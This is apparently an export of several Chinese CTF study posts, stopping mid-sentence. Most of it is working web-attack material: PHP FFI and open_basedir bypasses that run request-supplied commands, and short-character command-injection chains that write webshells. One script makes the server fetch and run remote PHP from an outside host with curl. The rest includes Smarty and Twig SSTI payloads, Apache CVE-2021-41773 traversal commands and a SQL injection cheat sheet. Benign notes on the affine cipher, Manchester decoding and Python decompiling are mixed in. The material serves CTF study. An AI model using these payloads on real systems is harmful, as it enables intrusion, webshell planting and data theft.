123//直接调用php源码中的函数，php_exec的type为3时对应的是passthru，直接将结果原始输出$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]); 123456789//使用c里的popen，然后从管道中读取结果$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123; $d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/* 参考 PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 ​ bypass open_basedir12mkdir(&#x27;/tmp/test&#x27;);chdir(&#x27;/tmp/test&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;));@eval($_POST[a]); echo 1;chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/flag&#x27;)); ​ 长度限制 7字符 123456#写入语句&lt;?php eval($_GET[1]);#base64编码后PD9waHAgZXZhbCgkX0dFVFsxXSk7#需要被执行的语句：echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617#!/usr/bin/python# -*- coding: UTF-8 -*- import requests url = &quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip())) #检查是否攻击成功test = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 5字符 思路1 拼接字符串写入一句话，同7字符。 思路2 1&lt;?php eval($_GET[1]); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;0&gt;a&gt;hp&gt;p\\\\&gt;1.\\\\&gt;\\&gt;\\\\&gt;-d\\\\&gt;\\ \\\\&gt;64\\\\&gt;se\\\\&gt;ba\\\\&gt;\\|\\\\&gt;7\\\\&gt;Sk\\\\&gt;X\\\\&gt;x\\\\&gt;Fs\\\\&gt;FV\\\\&gt;d\\\\&gt;X0\\\\&gt;k\\\\&gt;g\\\\&gt;bC\\\\&gt;h\\\\&gt;XZ\\\\&gt;gZ\\\\&gt;A\\\\&gt;aH\\\\&gt;w\\\\&gt;D9\\\\&gt;P\\\\&gt;S&#125;\\\\&gt;IF\\\\&gt;&#123;\\\\&gt;\\$\\\\&gt;o\\\\&gt;ch\\\\&gt;e\\\\sh 0sh f 12345678910111213#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip()))#检查是否攻击成功test = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 4字符 思路1 传入&gt;cat，在目标目录下写入cat文件； 再使用通配符进行执行&gt;* /*，读取根目录下的flag文件。 思路2 字符拼接 12345678&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)&gt;rev*v&gt;0 (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)sh 0 (sh执行0里面的内容) 思路3 反弹shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibtarget = &#x27;http://52.197.41.31/&#x27; # 存放待下载文件的公网主机的IPshell_ip = &#x27;xx.xx.xx.xx&#x27; # 本机IPyour_ip = r.get(&#x27;http://ipv4.icanhazip.com/&#x27;).text.strip() # 将shell_IP转换成十六进制ip = &#x27;0x&#x27; + &#x27;&#x27;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(&#x27;.&#x27;)]) reset = target + &#x27;?reset&#x27;cmd = target + &#x27;?cmd=&#x27;sandbox = target + &#x27;sandbox/&#x27; + hashlib.md5(&#x27;orange&#x27; + your_ip).hexdigest() + &#x27;/&#x27; # payload某些位置的可选字符pos0 = random.choice(&#x27;efgh&#x27;)pos1 = random.choice(&#x27;hkpq&#x27;)pos2 = &#x27;g&#x27; # 随意选择字符 payload = [ &#x27;&gt;dir&#x27;, # 创建名为 dir 的文件 &#x27;&gt;%s&gt;&#x27; % pos0, # 假设pos0选择 f , 创建名为 f&gt; 的文件 &#x27;&gt;%st-&#x27; % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t&gt;s &#x27;&gt;sl&#x27;, # 创建名为 &gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f&gt; kt- sl &#x27;*&gt;v&#x27;, # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ， # 前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 &#x27;&gt;rev&#x27;, # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v &#x27;*v&gt;%s&#x27; % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f # 续行分割 curl 0x11223344|php 并逆序写入 &#x27;&gt;p&#x27;, &#x27;&gt;ph\\&#x27;, &#x27;&gt;|\\&#x27;, &#x27;&gt;%s\\&#x27; % ip[8:10], &#x27;&gt;%s\\&#x27; % ip[6:8], &#x27;&gt;%s\\&#x27; % ip[4:6], &#x27;&gt;%s\\&#x27; % ip[2:4], &#x27;&gt;%s\\&#x27; % ip[0:2], &#x27;&gt; \\&#x27;, &#x27;&gt;rl\\&#x27;, &#x27;&gt;cu\\&#x27;, &#x27;sh &#x27; + pos2, # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 &#x27;sh &#x27; + pos0, # sh f 执行curl命令，下载文件，写入木马。] s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print &#x27;[%d]&#x27; % s.status_code, s.url sleep(0.1)s = r.get(sandbox + &#x27;fun.php?cmd=uname -a&#x27;)print &#x27;[%d]&#x27; % s.status_code, s.urlprint s.text ​ 模板引擎对于PHP的模板引擎，很有可能是smarty或者twig。 根据流程图测试： smarty12345678910111213141516171819202122232425262728X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125; （有回显）&#123;$smarty.version&#125; （smarty版本号）&#123;php&#125;phpinfo();&#123;/php&#125; （废弃）&#123;if phpinfo()&#125;&#123;/if&#125;&#123;self::getStreamVariable(“file:///etc/passwd”)&#125; （旧版本）&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(\\&#x27;id\\&#x27;)&#125;&#x27;)&#125;&#123;function name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function &#x27;&#125;&#123;/function&#125;# Smarty3 string:&#123;include file=&#x27;C:/Windows/win.ini&#x27;&#125;string:&#123;function name=&#x27;x()&#123;&#125;;system(whoami);function &#x27;&#125;&#123;/function&#125; （CVE-2021-26120，Smarty&lt;3.1.39）string:&#123;$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCompileDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCacheDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125; （CVE-2021-26119，Smarty=3.1.44/4.1.0）eval:&#123;math equation=&#x27;(&quot;\\163\\171\\163\\164\\145\\155&quot;)(&quot;\\167\\150\\157\\141\\155\\151&quot;)&#x27;&#125; （CVE-2021-29454，PHP7，Smarty&lt;3.1.42/&lt;4.0.2） twig1234567891011121314&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;POST /subscribe?0=cat+/etc/passwd HTTP/1.1&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125; 参考：TWIG 全版本通用 SSTI payloads ​ 反混淆https://www.zhaoyuanma.com/phpjm.html https://yoursunny.com/p/PHP-decode/ ​ 中间件漏洞Apache Apache 2.4.49 CVE-2021-41773 目录穿越漏洞。可以读取到Apache服务器Web目录以外的其他文件，或者读取Web中的脚本源码，或者在开启cgi或cgid的服务器上执行任意命令。 curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd curl -v --data &quot;echo;命令&quot; &#39;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39; ​ 其他opcacheopencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用） opcache缓存getshell","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"}],"author":"Lazzaro"},{"title":"仿射密码","slug":"crypto-仿射密码","date":"2020-05-18T10:56:48.000Z","updated":"2020-06-14T07:33:04.957Z","comments":true,"path":"2020/05/18/crypto-仿射密码/","link":"","permalink":"https://lazzzaro.github.io/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"仿射密码仿射密码是一种替换密码。它是一个字母对一个字母的。 加密函数 $e(x)=ax+b{\\pmod {m}}$ 其中 $a$ 和 $m$ 互质，$m$ 是字母的数目。 解密函数 $d(x)=a^{-1}(x-b){\\pmod {m}}$ 其中 $a^{-1}$ 是 $a$ 在 $ \\mathbb {Z} _{m}$ 群的乘法逆元。 仿射密码为单表加密的一种，字母系统中所有字母都由简单数学方程加密，对应至数值，或转回字母。 其仍有所有替代密码之弱处。所有字母皆借由方程 $(ax+b)\\pmod {26}$ 加密，$b$ 为移动大小。 当 $a=1$，仿射加密为凯撒密码，因该加密方程可简化为线性移动。 代码 对应字母表 1234# 仿射密码对应字母表def affine(a, b): for i in range(26): print chr(i+65) + &quot;: &quot; + chr(((a*i+b)%26)+65) 一般情况 123456789import gmpy2def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"曼彻斯特编码","slug":"crypto-曼彻斯特编码","date":"2020-05-17T13:26:35.000Z","updated":"2020-05-18T10:58:43.942Z","comments":true,"path":"2020/05/17/crypto-曼彻斯特编码/","link":"","permalink":"https://lazzzaro.github.io/2020/05/17/crypto-%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/","excerpt":"","text":"man有2个不同的规范，在二进制位的发送方式上还有正序和逆序之分，所以对给定的编码后的数据进行解码处理的时候，得考虑使用的规范和字节序。 曼彻斯特编码有2个不同的规范，在二进制位的发送方式上还有正序和逆序之分，所以对给定的编码后的数据进行解码处理的时候，得考虑使用的规范和字节序。 1. 曼彻斯特编码 标准曼彻斯特编码 由G. E. Thomas, Andrew S. Tanenbaum等人在1949年提出的，它规定0是由低-高的电平跳变表示，1是高-低的电平跳变，即01为0，10为1。 IEEE曼彻斯特编码： 在IEEE 802.4（令牌总线）和低速版的IEEE 802.3（以太网）中规定，按照这样的说法，低-高电平跳变表示1，高-低的电平跳变表示0，即01为1，10为0。 2. 差分曼彻斯特编码后一个信号如果与前一个信号跳变相同，则为0，不同，则为1，例如，0101，1010为0，0110，1001为1。第一个信号位如何确定，查到有资料说： 如果中间位电平从低到高，则表示0；如果中间位电平从高到低，则表示1； 但有的题好像又是直接忽略第一位，待解。 其他解法 只有5，6，9，a这4种字符： 5 - 0101；6 - 0110；9 - 1001；a - 1010。 然后转换为16进制，再转换成字符串即可获得flag。 3. 关于字节逆序的问题在某个传输规范中，每个字节的8个比特位会逆序发送，如发送：01001001 10101010，发送顺序会变成10010010 01010101。因此这里也是做题中的一个坑。 4. 通用代码代码在差分曼彻斯特编码的解码中，使用了忽略第一位的方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: utf-8 -*-import structimport mathdef long_to_bytes(n): s = b&#x27;&#x27; pack = struct.pack while n &gt; 0: s = pack(&#x27;&gt;I&#x27;, n &amp; 0xffffffff) + s n = n &gt;&gt; 32 for i in range(len(s)): if s[i] != b&#x27;\\000&#x27;[0]: break else: s = b&#x27;\\000&#x27; i = 0 s = s[i:] return s#字节逆序def byteinvert(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//8): ret+=str_bin[i*8:i*8+8][::-1] return ret#标准曼彻斯特def MCST_stand(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//2): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;0&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;1&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#IEEE规范的曼彻斯特def MCST_IEEE(str_bin): ret=&#x27;&#x27; for i in range(math.ceil(len(str_bin)/8)): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;1&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;0&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#差分曼彻斯特def MCST_diff(str_bin): ret=&#x27;&#x27; for i in range(0,len(str_bin)//2-1): x1=str_bin[i*2:i*2+2] x2=str_bin[i*2+2:i*2+4] if x1==x2: ret+=&#x27;0&#x27; else: ret+=&#x27;1&#x27; return retif __name__ == &quot;__main__&quot;: str_hex=&#x27;9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669&#x27; #str_bin=&#x27;0101010101010101&#x27; str_bin=str(bin(int(str_hex,16)))[2:] m1=MCST_IEEE(str_bin) m2=MCST_stand(str_bin) m3=MCST_diff(str_bin) print(&#x27;\\nIEEE曼彻斯特:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n 标准曼彻斯特:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n 差分曼彻斯特:&#x27;) print(m3) print(hex(int(m3,2))) print(long_to_bytes(int(m3,2))) print(&#x27;\\n=============字节逆序=============&#x27;) m1=byteinvert(m1) m2=byteinvert(m2) m3=byteinvert(m3) print(&#x27;\\nIEEE曼彻斯特:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n 标准曼彻斯特:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n 差分曼彻斯特:&#x27;) print(m3) print(hex(int(m3,2))) print(long_to_bytes(int(m3,2)))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"编码","slug":"编码","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"}],"author":"Lazzaro"},{"title":"python反编译","slug":"reverse-python反编译","date":"2020-05-16T10:29:46.000Z","updated":"2022-03-29T12:10:38.034Z","comments":true,"path":"2020/05/16/reverse-python反编译/","link":"","permalink":"https://lazzzaro.github.io/2020/05/16/reverse-python%E5%8F%8D%E7%BC%96%E8%AF%91/","excerpt":"","text":"​ python反编译 .exe → .pyc工具： pyinstxtractor https://github.com/extremecoders-re/pyinstxtractor https://github.com/countercept/python-exe-unpacker 命令：python pyinstxtractor.py [filename] 转换出来的主程序格式不对，还需要对其进行手动修复。 需要在该文件起始位置加上8个字节的pyc头，由4字节的magic和4字节的时间戳组成，其中magic会因为python版本的不同而不同，有个技巧就是，查看struct文件的magic，直接复制过去，保存为.pyc文件。 Pyinstaller https://github.com/pyinstaller/pyinstaller 命令： python archive_viewer.py [filename] ? x src ? x struct 两者对比文件头，添加12字节。 .pyc → .py工具： uncompyle6 - https://pypi.org/project/uncompyle6/ decompyle3 - https://github.com/rocky/python-decompile3 pycdc - https://github.com/zrax/pycdc 安装：pip install uncompyle6 命令：uncompyle6 [filename].pyc &gt; [output-filename].py pyc文件恢复（去混淆）https://www.52pojie.cn/thread-912103-1-1.html 常见版本幻数python 2.7 - 03 F3 0D 0A python 3.6 - 33 0D 0D 0A python 3.7 - 42 0D 0D 0A python 3.8 - 55 0D 0D 0A python 3.9+ - 61 0D 0D 0A 恢复bytecode12345678910111213141516171819202122#安装环境import dis, marshal, sysheader_sizes = [ # (size, first version this applies to) # pyc files were introduced in 0.9.2 way, way back in June 1991. (8, (0, 9, 2)), # 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp (12, (3, 6)), # added 4 bytes file size # bytes 4-8 are flags, meaning of 9-16 depends on what flags are set # bit 0 not set: 9-12 timestamp, 13-16 file size # bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0) (16, (3, 7)), # inserted 4 bytes bit flag field at 4-8 # future version may add more bytes still, at which point we can extend # this table. It is correct for Python versions up to 3.9]header_size = next(s for s, v in reversed(header_sizes) if sys.version_info &gt;= v)with open(&#x27;main.pyc&#x27;, &quot;rb&quot;) as f: metadata = f.read(header_size) # first header_size bytes are metadata code = marshal.load(f) # rest is a marshalled code objectdis.dis(code)","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"反编译","slug":"反编译","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"}],"author":"Lazzaro"},{"title":"fuzz收集","slug":"web-fuzz收集","date":"2020-05-16T07:55:07.000Z","updated":"2020-05-16T07:57:54.874Z","comments":true,"path":"2020/05/16/web-fuzz收集/","link":"","permalink":"https://lazzzaro.github.io/2020/05/16/web-fuzz%E6%94%B6%E9%9B%86/","excerpt":"","text":"fuzz收集 任意文件读取https://github.com/ev0A/ArbitraryFileReadList","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"}],"author":"Lazzaro"},{"title":"SQL注入","slug":"web-SQL注入","date":"2020-05-15T17:43:10.000Z","updated":"2022-12-20T11:18:33.322Z","comments":true,"path":"2020/05/16/web-SQL注入/","link":"","permalink":"https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"万能密码123456789admin&#x27; --admin&#x27; #admin&#x27;/\\*&#x27; or 1=1--&#x27; or 1=1#&#x27; or 1=1/*&#x27;) or &#x27;1&#x27;=&#x27;1--&#x27;) or (&#x27;1&#x27;=&#x27;1-- 1&#x27;^1# (False注入) ​ 手注正常注入步骤（联合查询）查库名-&gt;查表名-&gt;查列名（字段名）-&gt;查值（数据） 字段数量猜解 1order by 4 --+ 判断页面回显数据字段位置 1union select 1,2,3,4,x... --+ 数据库名 12345select database()select schema_name from information_schema.schemata;-- MySQL8新特性(&gt;8.0.21)table information_schema.TABLESPACES_EXTENSIONS 表名 1union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() union查询 12345UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* 列出所有用户自定义数据库中的表 */-- MySQL 4版本时用version=9，MySQL 5版本时用version=10UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* 列出当前数据库中的表 */SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=&#x27;information_schema&#x27; AND table_schema!=&#x27;mysql&#x27;; 盲注 1234AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &#x27;A&#x27;-- MySQL8新特性and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)&gt;(BINARY(&#x27;a&#x27;),&#x27;0&#x27;)# 报错 12AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- 在5.1.5版本中成功。 列名（字段名） 1Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*此处的表名为字符串型，也通过十六进制表示*/ union查询 1UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27; 盲注 1AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#x27;A&#x27; 报错 1234-- 在5.1.5版本中成功AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1版本修复了AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1))); 值查询 1234Union select 1,2,column_name,4,xxx from (database_name.)table_name-- MySQL8新特性and (table flag limit 1,1)&gt;(BINARY(&#x27;a&#x27;))# 无回显 盲注 布尔盲注使用场景：对真/假条件返回的内容很容易区分。 1234567(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,1,0)select * from users where username=nouser or length(database())&gt;8select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130-- 通配符select * from users where username=&#x27;xxx&#x27; and passwd=&#x27;-1&#x27; or passwd like &#x27;&#123;&#125;%&#x27;# 时间盲注依赖于通过页面返回的延迟时间来判断条件是否正确。 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。 1234567891011121314151617-- sleep()(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,sleep(3),1)select * from users where username=$username (and | or) if(length(database())&gt;8,sleep(3),1)-- benchmark()or benchmark(5000000,md5(&#x27;test&#x27;))or if(length(database())&gt;5,benchmark(1500000,md5(&#x27;test&#x27;)),1)-- pg_sleep()(and | or) (case when (select substr(password,1,1) from users)=&#x27;a&#x27; then pg_sleep(5) else pg_sleep(0) end)and (select case when(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;) then (select &#x27;roarctf&#x27; from pg_sleep(3)) else &#x27;1&#x27; end)=&#x27;roarctf&#x27;-- 笛卡尔积 heavy queryselect * from users where id=1 and 1&gt;(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C);select * from users where id=1 and if(1,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,0) and &#x27;1&#x27;=&#x27;1&#x27;; 报错注入通过特殊函数的错误使用使其参数被页面输出。 前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。 常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等。 123456(where|and|or) exp(~(select * from(select user())a));(where|and|or) pow(~(select * from(select user())a),9999);(where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1);(where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); limit注入使用 PROCEDURE函数进行注入，ANALYSE支持两个参数。 123select id from users order by id desc limit 0,1 procedure analyse(1,1);select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);select id from users order by id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制文件 update注入123#盲注update users set username = &#x27;0&#x27;|if((substr(user(),1,1) regexp 